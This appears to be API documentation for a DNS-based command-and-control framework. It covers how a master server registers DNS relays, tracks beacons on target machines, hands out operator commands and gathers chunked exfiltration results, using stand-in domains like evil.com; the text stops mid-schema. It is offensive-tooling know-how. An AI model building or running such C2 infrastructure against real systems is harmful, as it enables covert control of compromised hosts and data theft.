# Master Server API Reference
## Complete Documentation for DNS Server ↔ Master Communication

**Version:** 0.3.0  
**Last Updated:** November 6, 2025  
**Status:** Production Ready

---

## Table of Contents

1. [Overview](#overview)
2. [Authentication](#authentication)
3. [API Endpoints](#api-endpoints)
4. [Flow Diagrams](#flow-diagrams)
5. [Error Handling](#error-handling)
6. [Rate Limiting](#rate-limiting)
7. [Database Operations](#database-operations)
8. [Troubleshooting](#troubleshooting)

---

## Overview

The Master Server API provides centralized coordination for distributed DNS C2 servers in the Shadow Mesh architecture. It handles:

- **DNS Server Registration** - Auto-discovery and domain synchronization
- **Beacon Management** - Centralized beacon tracking across all DNS servers
- **Task Distribution** - Coordinated task assignment and result collection
- **Stager Deployment** - Client binary distribution and progress tracking
- **Cross-Server Awareness** - Beacon and task synchronization between servers

### Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    MASTER SERVER (Coordinator)                   │
│                                                                  │
│  ┌─────────────┐  ┌──────────────┐  ┌────────────────────────┐ │
│  │   Web UI    │  │  Operator    │  │   Master Database      │ │
│  │  Dashboard  │  │     API      │  │  - beacons             │ │
│  └─────────────┘  └──────────────┘  │  - tasks               │ │
│                                      │  - dns_servers         │ │
│  ┌────────────────────────────────┐ │  - beacon_dns_contacts │ │
│  │     DNS Server API (This Doc)  │ │  - stager_sessions     │ │
│  │  /api/dns-server/*             │ │  - result_chunks       │ │
│  └────────────────────────────────┘ └────────────────────────┘ │
└────────────────────────┬─────────────────────────────────────────┘
                         │
         ┌───────────────┼───────────────┐
         │               │               │
         ▼               ▼               ▼
    ┌─────────┐    ┌─────────┐    ┌─────────┐
    │DNS Srv 1│    │DNS Srv 2│    │DNS Srv 3│
    │evil.com │    │bad.org  │    │c2.net   │
    └─────────┘    └─────────┘    └─────────┘
         │               │               │
         └───────────────┼───────────────┘
                         │
              ┌──────────┴──────────┐
              │                     │
              ▼                     ▼
         ┌─────────┐           ┌─────────┐
         │Beacon 1 │           │Beacon 2 │
         │(Target) │           │(Target) │
         └─────────┘           └─────────┘
```

---

## Authentication

### Authentication Scheme

All DNS Server API endpoints use a **two-factor authentication** scheme:

1. **API Key** - Included in request body (POST) or query params (GET)
2. **X-DNS-Server-ID Header** - Set by MasterClient, validated by middleware

### Authentication Flow

```
DNS Server Request
      │
      ▼
┌──────────────────────────────────────────────┐
│  dnsServerAuthMiddleware                     │
│  1. Read request body/query params           │
│  2. Extract dns_server_id & api_key          │
│  3. Call VerifyDNSServerAPIKey(id, key)      │
│  4. If valid: Set X-DNS-Server-ID header     │
│  5. Restore body for handler                 │
└──────────────────────────────────────────────┘
      │
      ▼ (if auth success)
┌──────────────────────────────────────────────┐
│  API Handler                                 │
│  - Reads X-DNS-Server-ID from header         │
│  - Processes request                         │
│  - Returns response                          │
└──────────────────────────────────────────────┘
```

### MasterClient Implementation

**File:** `Server/master_client.go`

```go
func (mc *MasterClient) doRequest(method, endpoint string, body interface{}) ([]byte, error) {
    // Create request
    req, err := http.NewRequest(method, url, reqBody)
    
    // Set authentication headers
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("User-Agent", "Unkn0wnC2-DNSServer/0.3.0")
    req.Header.Set("X-DNS-Server-ID", mc.serverID)  // CRITICAL: Always set
    
    // Include credentials in body/query
    // POST: { "dns_server_id": "...", "api_key": "...", ...}
    // GET:  ?dns_server_id=...&api_key=...
    
    // Execute with retry logic (3 attempts, exponential backoff)
    resp, err := mc.httpClient.Do(req)
    // ...
}
```

### Security Features

- **TLS 1.2+** - All communications encrypted
- **Rate Limiting** - 1000 requests/minute per DNS server
- **API Key Rotation** - Supported via re-registration
- **Header Validation** - Server ID must match credentials
- **Token Bucket** - Per-IP rate limiting with automatic cleanup

---

## API Endpoints

### Summary Table

| Endpoint | Method | Purpose | Call Frequency |
|----------|--------|---------|----------------|
| `/api/dns-server/register` | POST | Register DNS server, get domain list | Once on startup |
| `/api/dns-server/checkin` | POST | Heartbeat, get cache tasks & domain updates | Every 30s |
| `/api/dns-server/beacon` | POST | Report beacon check-in | Per beacon checkin |
| `/api/dns-server/tasks` | GET | Poll for pending tasks | Every 5s |
| `/api/dns-server/result` | POST | Submit task result chunk | Per result chunk |
| `/api/dns-server/progress` | POST | Report task progress | Per progress update |
| `/api/dns-server/task-statuses` | GET | Get completed task statuses | Every 10s |
| `/api/dns-server/beacons` | GET | Sync beacon list | Every 60s |
| `/api/dns-server/stager/init` | POST | Initialize stager session | Per stager init |
| `/api/dns-server/stager/chunk` | POST | Get stager chunk | Per chunk request |
| `/api/dns-server/stager/contact` | POST | Report stager first contact | Per cached stager |
| `/api/dns-server/stager/progress` | POST | Report stager progress | Per chunk delivery |

---

### 1. DNS Server Registration

**Endpoint:** `POST /api/dns-server/register`  
**Purpose:** Register DNS server with Master and receive active domain list  
**Called:** Once on DNS server startup

#### Request

```json
{
  "server_id": "dns-server-uuid-1234",
  "domain": "evil.com",
  "address": "1.2.3.4:53",
  "api_key": "secret-api-key-here"
}
```

**Fields:**
- `server_id` (string, required) - Unique DNS server identifier
- `domain` (string, required) - DNS domain this server handles
- `address` (string, optional) - IP:Port for this DNS server
- `api_key` (string, required) - Authentication key

#### Response

```json
{
  "success": true,
  "message": "DNS server registered",
  "data": {
    "server_id": "dns-server-uuid-1234",
    "domain": "evil.com",
    "domains": [
      "evil.com",
      "bad.org",
      "malicious.net"
    ]
  }
}
```

**Fields:**
- `domains` (array) - List of ALL active DNS domains in the network

#### Database Operations

1. `RegisterDNSServer(server_id, domain, address, api_key)` - UPSERT dns_servers table
2. `GetActiveDNSServers()` - SELECT all active servers
3. Extract domains from server list

#### Error Responses

| Status | Error | Cause |
|--------|-------|-------|
| 400 | missing required fields | server_id, domain, or api_key missing |
| 401 | server_id mismatch | X-DNS-Server-ID ≠ body server_id |
| 500 | failed to register DNS server | Database error |

#### Flow Diagram

```
DNS Server                                Master Server                           Database
     │                                         │                                       │
     │  POST /api/dns-server/register          │                                       │
     ├────────────────────────────────────────>│                                       │
     │  {                                      │                                       │
     │    "server_id": "srv-1",                │  ┌──────────────────────────────────┐ │
     │    "domain": "evil.com",                ├──│ dnsServerAuthMiddleware        │ │
     │    "api_key": "key123"                  │  │ 1. Extract credentials          │ │
     │  }                                      │  │ 2. VerifyDNSServerAPIKey()      │ │
     │  Headers:                               │  │ 3. Set X-DNS-Server-ID header   │ │
     │    X-DNS-Server-ID: srv-1               │  └──────────────────────────────────┘ │
     │                                         │                                       │
     │                                         │  ┌──────────────────────────────────┐ │
     │                                         ├──│ handleDNSServerRegistration    │ │
     │                                         │  │ 1. Decode request body          │ │
     │                                         │  │ 2. Validate required fields     │ │
     │                                         │  │ 3. Verify header matches body   │ │
     │                                         │  └──────────────────────────────────┘ │
     │                                         │                                       │
     │                                         │  RegisterDNSServer(srv-1, evil.com)   │
     │                                         ├──────────────────────────────────────>│
     │                                         │                                       │  INSERT INTO dns_servers
     │                                         │                                       │  (id, domain, address, api_key)
     │                                         │                                       │  VALUES (...)
     │                                         │                                       │  ON CONFLICT(id) DO UPDATE
     │                                         │<──────────────────────────────────────┤
     │                                         │  Success                              │
     │                                         │                                       │
     │                                         │  GetActiveDNSServers()                │
     │                                         ├──────────────────────────────────────>│
     │                                         │                                       │  SELECT * FROM dns_servers
     │                                         │                                       │  WHERE status = 'active'
     │                                         │<──────────────────────────────────────┤
     │                                         │  [                                    │
     │                                         │    {domain: "evil.com"},              │
     │                                         │    {domain: "bad.org"},               │
     │                                         │    {domain: "malicious.net"}          │
     │                                         │  ]                                    │
     │                                         │                                       │
     │  200 OK                                 │  ┌──────────────────────────────────┐ │
     │<────────────────────────────────────────├──│ Extract domain strings         │ │
     │  {                                      │  │ Build response JSON            │ │
     │    "success": true,                     │  └──────────────────────────────────┘ │
     │    "data": {                            │                                       │
     │      "domains": ["evil.com", ...]       │                                       │
     │    }                                    │                                       │
     │  }                                      │                                       │
     │                                         │                                       │
     │  ┌────────────────────────────────┐    │                                       │
     ├──│ Store domains in C2Manager     │    │                                       │
     │  │ SetKnownDomains(domains)       │    │                                       │
     │  │ DNS server ready for operations│    │                                       │
     │  └────────────────────────────────┘    │                                       │
```

---

### 2. DNS Server Check-In

**Endpoint:** `POST /api/dns-server/checkin`  
**Purpose:** Periodic heartbeat, receive stager cache tasks and domain updates  
**Called:** Every 30 seconds

#### Request

```json
{
  "dns_server_id": "dns-server-uuid-1234",
  "api_key": "secret-api-key-here",
  "status": "active",
  "stats": {
    "active_beacons": 15,
    "cached_chunks": 450,
    "uptime_seconds": 86400
  }
}
```

#### Response

```json
{
  "success": true,
  "message": "check-in recorded",
  "pending_caches": [
    {
      "client_binary_id": "client-abc123",
      "total_chunks": 150,
      "chunks": ["chunk1...", "chunk2...", "..."]
    }
  ],
  "domain_updates": ["evil.com", "bad.org", "new-domain.net"],
  "data": {
    "dns_server_id": "dns-server-uuid-1234",
    "timestamp": "2025-11-06T10:30:00Z",
    "is_first_checkin": false
  }
}
```

**Special Behaviors:**
- `is_first_checkin: true` - Master queues domain updates for ALL DNS servers with active beacons
- `pending_caches` - Stager chunks from Master builder, marked as delivered after response
- `domain_updates` - New domains added since last checkin, marked as delivered after response

#### Database Operations

1. `UpdateDNSServerCheckin(server_id)` - UPDATE last_heartbeat, detect first checkin
2. `GetPendingStagerCaches(server_id)` - SELECT from stager_cache_queue
3. `MarkStagerCacheDelivered(cache_ids)` - UPDATE status = 'delivered'
4. If first checkin:
   - `GetAllActiveDomains()` - SELECT domains from dns_servers WHERE status='active'
   - `GetActiveBeacons(30)` - SELECT beacons seen in last 30 minutes
   - `QueueDomainUpdate(server_id, domains)` - INSERT into domain_update_queue
5. `GetPendingDomainUpdates(server_id)` - SELECT from domain_update_queue
6. `MarkDomainUpdateDelivered(server_id)` - UPDATE status = 'delivered'

#### Flow Diagram

```
DNS Server              Master Server                  Database                  Other DNS Servers
     │                        │                            │                             │
     │  POST /api/dns-server/checkin (every 30s)           │                             │
     ├───────────────────────>│                            │                             │
     │  {                     │                            │                             │
     │    "status": "active"  │  UpdateDNSServerCheckin()  │                             │
     │  }                     ├───────────────────────────>│                             │
     │                        │                            │  UPDATE dns_servers         │
     │                        │                            │  SET last_heartbeat = NOW   │
     │                        │                            │  WHERE id = 'srv-1'         │
     │                        │<───────────────────────────┤                             │
     │                        │  is_first_checkin: true    │                             │
     │                        │                            │                             │
     │                        │  GetPendingStagerCaches()  │                             │
     │                        ├───────────────────────────>│                             │
     │                        │<───────────────────────────┤                             │
     │                        │  [cache_task_1, ...]       │                             │
     │                        │                            │                             │
     │                        │  MarkStagerCacheDelivered()│                             │
     │                        ├───────────────────────────>│                             │
     │                        │                            │                             │
     │                        │  ┌──────────────────────────────────────────────┐        │
     │                        │  │ IF is_first_checkin (async goroutine):       │        │
     │                        │  │ 1. GetAllActiveDomains()                     │        │
     │                        │  │ 2. GetActiveBeacons(30 min threshold)        │        │
     │                        │  │ 3. Find DNS servers with active beacons      │        │
     │                        │  │ 4. QueueDomainUpdate() for each server       │        │
     │                        │  └──────────────────────────────────────────────┘        │
     │                        │                            │                             │
     │                        │  QueueDomainUpdate(srv-2, domains)                       │
     │                        ├───────────────────────────>│                             │
     │                        │                            │  INSERT domain_update_queue │
     │                        │                            │  (server_id: 'srv-2',       │
     │                        │                            │   domains: [...])           │
     │                        │                            ├────────────────────────────>│
     │                        │                            │  (queued for srv-2)         │
     │                        │                            │                             │
     │                        │  GetPendingDomainUpdates() │                             │
     │                        ├───────────────────────────>│                             │
     │                        │<───────────────────────────┤                             │
     │                        │  ["evil.com", "bad.org"]   │                             │
     │                        │                            │                             │
     │                        │  MarkDomainUpdateDelivered()│                            │
     │                        ├───────────────────────────>│                             │
     │  200 OK                │                            │                             │
     │<───────────────────────┤                            │                             │
     │  {                     │                            │                             │
     │    "pending_caches": [...],                         │                             │
     │    "domain_updates": ["evil.com", "bad.org"]        │                             │
     │  }                     │                            │                             │
     │                        │                            │                             │
     │  ┌──────────────────┐  │                            │                             │
     ├──│ Process Caches   │  │                            │                             │
     │  │ Update Domains   │  │                            │                             │
     │  └──────────────────┘  │                            │                             │
```

---

### 3. Beacon Report

**Endpoint:** `POST /api/dns-server/beacon`  
**Purpose:** Report beacon check-in to Master for centralized tracking  
**Called:** Every time a beacon checks in to this DNS server

#### Request

```json
{
  "dns_server_id": "dns-server-uuid-1234",
  "api_key": "secret-api-key-here",
  "beacon": {
    "id": "beacon-abc-123",
    "hostname": "TARGET-PC",
    "username": "admin",
    "os": "Windows 10 Pro",
    "arch": "x64",
    "ip_address": "192.168.1.100",
    "first_seen": "2025-11-01T08:00:00Z",
    "last_seen": "2025-11-06T10:30:00Z"
  }
}
```

#### Response

```json
{
  "success": true,
  "message": "beacon registered"
}
```

#### Database Operations

1. `UpsertBeacon(id, hostname, username, os, arch, ip_address, dns_server_id, first_seen, last_seen)` - UPSERT beacons table
2. `GetDNSServers()` - SELECT to find domain for this dns_server_id
3. `RecordBeaconDNSContact(beacon_id, server_id, domain)` - UPSERT beacon_dns_contacts (async)

#### Flow Diagram

```
Beacon Client       DNS Server                Master Server                  Database
     │                   │                          │                             │
     │  DNS Query        │                          │                             │
     ├──────────────────>│                          │                             │
     │  abc123.evil.com  │  HandleCheckin()         │                             │
     │                   │  (beacon checks in)      │                             │
     │                   │                          │                             │
     │                   │  POST /api/dns-server/beacon                           │
     │                   ├─────────────────────────>│                             │
     │                   │  {                       │                             │
     │                   │    "beacon": {           │                             │
     │                   │      "id": "abc123",     │  UpsertBeacon()             │
     │                   │      "hostname": "PC1",  ├────────────────────────────>│
     │                   │      "ip_address": "..." │                             │  INSERT INTO beacons (...)
     │                   │    }                     │                             │  VALUES (...)
     │                   │  }                       │                             │  ON CONFLICT(id) DO UPDATE
     │                   │                          │                             │  SET hostname = ...,
     │                   │                          │                             │      last_seen = ...,
     │                   │                          │                             │      dns_server_id = 'srv-1'
     │                   │                          │<────────────────────────────┤
     │                   │                          │  Success                    │
     │                   │                          │                             │
     │                   │                          │  GetDNSServers()            │
     │                   │                          ├────────────────────────────>│
     │                   │                          │<────────────────────────────┤
     │                   │                          │  [{id: 'srv-1', domain: 'evil.com'}]
     │                   │                          │                             │
     │                   │                          │  ┌─────────────────────────────────────┐
     │                   │                          │  │ async: RecordBeaconDNSContact()     │
     │                   │                          ├──│ (beacon_id, server_id, domain)      │
     │                   │                          │  └─────────────────────────────────────┘
     │                   │                          │                             │
     │                   │                          │  RecordBeaconDNSContact()   │
     │                   │                          ├────────────────────────────>│
     │                   │                          │                             │  INSERT INTO beacon_dns_contacts
     │                   │                          │                             │  (beacon_id, dns_server_id, dns_domain)
     │                   │                          │                             │  VALUES ('abc123', 'srv-1', 'evil.com')
     │                   │                          │                             │  ON CONFLICT DO UPDATE
     │                   │                          │                             │  SET last_contact = NOW,
     │                   │                          │                             │      contact_count++
     │                   │  200 OK                  │                             │
     │                   │<─────────────────────────┤                             │
     │                   │  {"success": true}       │                             │
     │                   │                          │                             │
     │  DNS Response     │                          │                             │
     │<──────────────────┤                          │                             │
     │  (task or ACK)    │                          │                             │
```

---

### 4. Get Tasks For DNS Server

**Endpoint:** `GET /api/dns-server/tasks`  
**Purpose:** Poll for pending tasks assigned to this DNS server's beacons  
**Called:** Every 5 seconds

#### Request

```
GET /api/dns-server/tasks?dns_server_id=srv-1&api_key=key123
```

#### Response

```json
[
  {
    "id": "task-uuid-1",
    "beacon_id": "beacon-abc-123",
    "command": "whoami",
    "status": "pending"
  },
  {
    "id": "task-uuid-2",
    "beacon_id": "beacon-def-456",
    "command": "ipconfig /all",
    "status": "pending"
  }
]
```

**Note:** Response is a direct array, not wrapped in an object.

#### Database Operations

1. `GetTasksForDNSServer(server_id)` - SELECT tasks WHERE beacon.dns_server_id = server_id AND status = 'pending'
2. `MarkTasksSent(task_ids)` - UPDATE status = 'sent' to prevent duplicate delivery

#### Flow Diagram

```
DNS Server                        Master Server                           Database
     │                                  │                                      │
     │  GET /api/dns-server/tasks       │                                      │
     │  (polling every 5s)              │                                      │
     ├─────────────────────────────────>│                                      │
     │  ?dns_server_id=srv-1            │  GetTasksForDNSServer('srv-1')      │
     │  &api_key=key123                 ├─────────────────────────────────────>│
     │                                  │                                      │  SELECT t.*
     │                                  │                                      │  FROM tasks t
     │                                  │                                      │  JOIN beacons b ON t.beacon_id = b.id
     │                                  │                                      │  WHERE b.dns_server_id = 'srv-1'
     │                                  │                                      │    AND t.status = 'pending'
     │                                  │<─────────────────────────────────────┤
     │                                  │  [                                   │
     │                                  │    {id: 'task-1', beacon_id: 'b1',  │
     │                                  │     command: 'whoami'},              │
     │                                  │    {id: 'task-2', beacon_id: 'b2',  │
     │                                  │     command: 'hostname'}             │
     │                                  │  ]                                   │
     │                                  │                                      │
     │                                  │  MarkTasksSent(['task-1', 'task-2']) │
     │                                  ├─────────────────────────────────────>│
     │                                  │                                      │  UPDATE tasks
     │                                  │                                      │  SET status = 'sent'
     │                                  │                                      │  WHERE id IN (...)
     │                                  │<─────────────────────────────────────┤
     │  200 OK                          │                                      │
     │<─────────────────────────────────┤                                      │
     │  [                               │                                      │
     │    {"id": "task-1", ...},        │                                      │
     │    {"id": "task-2", ...}         │                                      │
     │  ]                               │                                      │
     │                                  │                                      │
     │  ┌────────────────────────┐      │                                      │
     ├──│ Queue tasks for        │      │                                      │
     │  │ beacons b1 and b2      │      │                                      │
     │  └────────────────────────┘      │                                      │
```

---

### 5. Submit Result

**Endpoint:** `POST /api/dns-server/result`  
**Purpose:** Submit task result or result chunk to Master  
**Called:** After beacon completes a task

#### Request

```json
{
  "dns_server_id": "dns-server-uuid-1234",
  "api_key": "secret-api-key-here",
  "task_id": "task-uuid-1",
  "beacon_id": "beacon-abc-123",
  "chunk_index": 0,
  "total_chunks": 1,
  "data": "base64-encoded-result-data"
}
```

**Chunking:**
- Single-chunk: `chunk_index: 0, total_chunks: 1`
- Multi-chunk: `chunk_index: 0-N, total_chunks: N+1`

#### Response

```json
{
  "success": true,
  "message": "result received"
}
```

or (for multi-chunk):

```json
{
  "success": true,
  "message": "chunk received",
  "data": {
    "received_chunks": 5,
    "total_chunks": 10,
    "status": "partial"
  }
}
```

#### Database Operations

1. `StoreTaskResultChunk(task_id, chunk_index, total_chunks, data)` - INSERT into result_chunks
2. If all chunks received:
   - Reassemble chunks
   - `UpdateTaskResult(task_id, full_result)` - UPDATE tasks SET result = ..., status = 'completed'
   - `MarkTaskComplete(task_id)` - UPDATE status = 'completed'

#### Flow Diagram

```
Beacon          DNS Server              Master Server                Database
  │                  │                        │                          │
  │  Task result     │                        │                          │
  ├─────────────────>│                        │                          │
  │  (via DNS)       │  SerializeResult()     │                          │
  │                  │  Split into chunks     │                          │
  │                  │  (if > 4KB)            │                          │
  │                  │                        │                          │
  │                  │  POST /api/dns-server/result                      │
  │                  ├───────────────────────>│                          │
  │                  │  {                     │                          │
  │                  │    "task_id": "t1",    │  StoreTaskResultChunk()  │
  │                  │    "chunk_index": 0,   ├─────────────────────────>│
  │                  │    "total_chunks": 3,  │                          │  INSERT INTO result_chunks
  │                  │    "data": "..."       │                          │  (task_id, chunk_index, data)
  │                  │  }                     │<─────────────────────────┤
  │                  │                        │                          │
  │                  │  200 OK                │  ┌─────────────────────────────┐
  │                  │<───────────────────────┤  │ Check if all chunks ready   │
  │                  │  {                     │  │ SELECT COUNT(*)             │
  │                  │    "status": "partial" │  │ FROM result_chunks          │
  │                  │  }                     │  │ WHERE task_id = 't1'        │
  │                  │                        │  └─────────────────────────────┘
  │                  │                        │                          │
  │                  │  POST chunk 1/3        │                          │
  │                  ├───────────────────────>│  StoreTaskResultChunk()  │
  │                  │                        ├─────────────────────────>│
  │                  │  200 OK (partial)      │                          │
  │                  │<───────────────────────┤                          │
  │                  │                        │                          │
  │                  │  POST chunk 2/3        │                          │
  │                  ├───────────────────────>│  StoreTaskResultChunk()  │
  │                  │                        ├─────────────────────────>│
  │                  │                        │  All chunks received!     │
  │                  │                        │                          │
  │                  │                        │  ┌─────────────────────────────┐
  │                  │                        │  │ Reassemble:                 │
  │                  │                        │  │ 1. SELECT chunks ORDER BY   │
  │                  │                        │  │    chunk_index              │
  │                  │                        │  │ 2. Concatenate data         │
  │                  │                        │  │ 3. Decode base64            │
  │                  │                        │  └─────────────────────────────┘
  │                  │                        │                          │
  │                  │                        │  UpdateTaskResult(full)  │
  │                  │                        ├─────────────────────────>│
  │                  │                        │                          │  UPDATE tasks
  │                  │                        │                          │  SET result = '...',
  │                  │                        │                          │      status = 'completed',
  │                  │                        │                          │      completed_at = NOW
  │                  │  200 OK (completed)    │                          │
  │                  │<───────────────────────┤                          │
  │                  │  {                     │                          │
  │                  │    "status": "completed"                          │
  │                  │  }                     │                          │
```

---

### 6. Submit Progress

**Endpoint:** `POST /api/dns-server/progress`  
**Purpose:** Report task progress (for large exfiltrations)  
**Called:** Periodically during multi-chunk result transmission

#### Request

```json
{
  "dns_server_id": "dns-server-uuid-1234",
  "api_key": "secret-api-key-here",
  "task_id": "task-uuid-1",
  "beacon_id": "beacon-abc-123",
  "received_chunks": 45,
  "total_chunks": 150,
  "status": "exfiltrating"
}
```

#### Response

```json
{
  "success": true,
  "message": "progress updated"
}
```

#### Database Operations

1. `UpdateTaskProgress(task_id, received_chunks, total_chunks, status)` - UPDATE tasks SET progress_*, status = 'exfiltrating'

#### Purpose

- Provides real-time feedback to operators via web UI
- Enables progress bars for large file exfiltrations
- Helps diagnose stuck or slow tasks

---

### 7. Get Task Statuses

**Endpoint:** `GET /api/dns-server/task-statuses`  
**Purpose:** Poll for completed task statuses (allows DNS server to clear beacon.CurrentTask)  
**Called:** Every 10 seconds

#### Request

```
GET /api/dns-server/task-statuses?dns_server_id=srv-1&api_key=key123
```

#### Response

```json
[
  {
    "id": "task-uuid-1",
    "beacon_id": "beacon-abc-123",
    "status": "completed"
  },
  {
    "id": "task-uuid-2",
    "beacon_id": "beacon-def-456",
    "status": "failed"
  }
]
```

#### Database Operations

1. `GetCompletedTasksForSync(server_id)` - SELECT tasks WHERE beacon.dns_server_id = server_id AND status IN ('completed', 'failed', 'partial') AND synced = false
2. `MarkTasksAsSynced(task_ids)` - UPDATE tasks SET synced = true (async, prevents re-sending)

#### Purpose

- DNS servers need to know when Master has completed task reassembly
- Allows clearing `beacon.CurrentTask` so new tasks can be assigned
- Prevents beacons from being stuck on completed tasks

---

### 8. Get Beacons For DNS Server

**Endpoint:** `GET /api/dns-server/beacons`  
**Purpose:** Sync complete beacon list for cross-server awareness  
**Called:** Every 60 seconds

#### Request

```
GET /api/dns-server/beacons?dns_server_id=srv-1&api_key=key123
```

#### Response

```json
[
  {
    "id": "beacon-abc-123",
    "hostname": "TARGET-PC-1",
    "username": "admin",
    "os": "Windows 10",
    "arch": "x64",
    "ip_address": "192.168.1.100",
    "dns_server_id": "srv-1",
    "last_seen": "2025-11-06T10:30:00Z"
  },
  {
    "id": "beacon-def-456",
    "hostname": "TARGET-PC-2",
    "username": "user",
    "os": "Windows 11",
    "arch": "x64",
    "ip_address": "192.168.1.101",
    "dns_server_id": "srv-2",
    "last_seen": "2025-11-06T10:29:00Z"
  }
]
```

**Important:** Returns ALL active beacons, not just this DNS server's beacons.

#### Database Operations

1. `GetActiveBeacons(10)` - SELECT * FROM beacons WHERE last_seen > NOW() - 10 minutes

#### Purpose

- Enables DNS servers to know about beacons on other servers
- If beacon switches servers (Shadow Mesh rotation), new server already knows about it
- Supports distributed task delivery

---

### 9-12. Stager APIs

*(Detailed documentation for stager APIs omitted for brevity - these handle on-demand and cached client binary delivery)*

---

## Flow Diagrams

### Complete Task Lifecycle

```
┌──────────────────────────────────────────────────────────────────────────────────┐
│  COMPLETE TASK LIFECYCLE: From Operator to Result                               │
└──────────────────────────────────────────────────────────────────────────────────┘

Operator     Web UI      Master Server         DNS Server       Beacon        Target
   │            │               │                    │             │             │
   │ Navigate to beacon.html   │                    │             │             │
   ├───────────>│               │                    │             │             │
   │            │  GET /api/beacons/{id}            │             │             │
   │            ├──────────────>│                    │             │             │
   │            │<──────────────┤ {beacon data}      │             │             │
   │            │               │                    │             │             │
   │ Type cmd   │               │                    │             │             │
   │ "whoami"   │               │                    │             │             │
   ├───────────>│               │                    │             │             │
   │            │  POST /api/beacons/{id}/task       │             │             │
   │            ├──────────────>│                    │             │             │
   │            │               │  CreateTask()      │             │             │
   │            │               ├──────────────────> DATABASE      │             │
   │            │               │  INSERT tasks      │             │             │
   │            │               │  (beacon_id, cmd,  │             │             │
   │            │               │   status=pending)  │             │             │
   │            │<──────────────┤ {task created}     │             │             │
   │            │               │                    │             │             │
   │  Task queued (UI updates) │                    │             │             │
   │            │               │                    │             │             │
   │            │               │  GET /api/dns-server/tasks       │             │
   │            │               │<───────────────────┤             │             │
   │            │               │  (polling every 5s)│             │             │
   │            │               │                    │             │             │
   │            │               │  GetTasksForDNSServer()          │             │
   │            │               ├──────────────────> DATABASE      │             │
   │            │               │  SELECT WHERE      │             │             │
   │            │               │  dns_server_id...  │             │             │
   │            │               │<───────────────────┤             │             │
   │            │               │  [{id, beacon_id,  │             │             │
   │            │               │    command}]       │             │             │
   │            │               │                    │             │             │
   │            │               │  MarkTasksSent()   │             │             │
   │            │               ├──────────────────> DATABASE      │             │
   │            │               │                    │             │             │
   │            │               │  Return tasks ────>│             │             │
   │            │               │                    │             │             │
   │            │               │                    │  Queue task │             │
   │            │               │                    │  for beacon │             │
   │            │               │                    │             │             │
   │            │               │                    │  DNS Query  │             │
   │            │               │                    │<────────────┤             │
   │            │               │                    │  (beacon    │             │
   │            │               │                    │   checkin)  │             │
   │            │               │                    │             │             │
   │            │               │                    │  DNS Reply: │             │
   │            │               │                    │  TASK cmd   │             │
   │            │               │                    ├────────────>│             │
   │            │               │                    │             │  Execute    │
   │            │               │                    │             ├────────────>│
   │            │               │                    │             │<────────────┤
   │            │               │                    │             │  Result     │
   │            │               │                    │             │             │
   │            │               │                    │  DNS Query  │             │
   │            │               │                    │<────────────┤             │
   │            │               │                    │  (with result)            │
   │            │               │                    │             │             │
   │            │               │  POST /api/dns-server/result     │             │
   │            │               │<───────────────────┤             │             │
   │            │               │  {                 │             │             │
   │            │               │    task_id,        │             │             │
   │            │               │    chunk_index: 0, │             │             │
   │            │               │    total_chunks: 1,│             │             │
   │            │               │    data: "..."     │             │             │
   │            │               │  }                 │             │             │
   │            │               │                    │             │             │
   │            │               │  StoreTaskResultChunk()          │             │
   │            │               ├──────────────────> DATABASE      │             │
   │            │               │  UpdateTaskResult()│             │             │
   │            │               │  (status=completed)│             │             │
   │            │               │                    │             │             │
   │            │               │  Return success ──>│             │             │
   │            │               │                    │             │             │
   │            │               │  GET /api/dns-server/task-statuses             │
   │            │               │<───────────────────┤             │             │
   │            │               │  (polling 10s)     │             │             │
   │            │               │                    │             │             │
   │            │               │  GetCompletedTasks()             │             │
   │            │               ├──────────────────> DATABASE      │             │
   │            │               │<───────────────────┤             │             │
   │            │               │  [{id, status:     │             │             │
   │            │               │    "completed"}]   │             │             │
   │            │               │                    │             │             │
   │            │               │  MarkTasksAsSynced()             │             │
   │            │               ├──────────────────> DATABASE      │             │
   │            │               │                    │             │             │
   │            │               │  Return statuses ─>│             │             │
   │            │               │                    │             │             │
   │            │               │                    │  Clear      │             │
   │            │               │                    │  beacon.    │             │
   │            │               │                    │  CurrentTask│             │
   │            │               │                    │             │             │
   │  GET /api/tasks/{id}/result                    │             │             │
   ├───────────>│               │                    │             │             │
   │            ├──────────────>│  GetTaskResult()   │             │             │
   │            │               ├──────────────────> DATABASE      │             │
   │            │<──────────────┤  {result: "..."}   │             │             │
   │            │               │                    │             │             │
   │  View result in UI         │                    │             │             │
   │<───────────┤               │                    │             │             │
   │  "DOMAIN\admin"            │                    │             │             │
```

---

## Error Handling

### HTTP Status Codes

| Code | Meaning | Common Causes |
|------|---------|---------------|
| 200 | Success | Request processed successfully |
| 400 | Bad Request | Invalid JSON, missing required fields |
| 401 | Unauthorized | Invalid API key, server ID mismatch |
| 429 | Too Many Requests | Rate limit exceeded (>1000 req/min) |
| 500 | Internal Server Error | Database error, unexpected exception |
| 503 | Service Unavailable | Database connection lost, Master overloaded |

### Retry Policy

MasterClient implements exponential backoff:

```go
maxRetries := 3
for attempt := 1; attempt <= maxRetries; attempt++ {
    resp, err := httpClient.Do(req)
    
    // Retry on 500/503 only
    if resp.StatusCode == 500 || resp.StatusCode == 503 {
        backoff := time.Duration(attempt * attempt) * time.Second
        // Attempt 1: 1s, Attempt 2: 4s, Attempt 3: 9s
        time.Sleep(backoff)
        continue
    }
    
    // All other errors: fail immediately
    return resp, err
}
```

### Graceful Degradation

DNS servers can operate independently if Master becomes unavailable:

- **Beacon check-ins** - Continue to function with local beacon tracking
- **Task execution** - Deliver queued tasks from local cache
- **Result collection** - Store results locally, sync when Master returns
- **Domain rotation** - Use last-known domain list

---

## Rate Limiting

### Configuration

```go
authLimiter:  5 requests/minute     // Login attempts
apiLimiter:   100 requests/minute   // Operator API
dnsLimiter:   1000 requests/minute  // DNS Server API
```

### Per-IP Token Bucket

- Each IP address gets independent bucket
- Tokens refill continuously over time window
- Automatic cleanup of old visitor entries (every 5 minutes)

### Rate Limit Response

```json
{
  "error": "Too Many Requests",
  "message": "rate limit exceeded"
}
```

**HTTP 429** status code triggers exponential backoff in client.

---

## Database Operations

### Key Tables

#### `dns_servers`

```sql
CREATE TABLE dns_servers (
    id TEXT PRIMARY KEY,
    domain TEXT UNIQUE NOT NULL,
    address TEXT,
    api_key TEXT NOT NULL,
    status TEXT DEFAULT 'active',
    last_heartbeat TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    registered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

#### `beacons`

```sql
CREATE TABLE beacons (
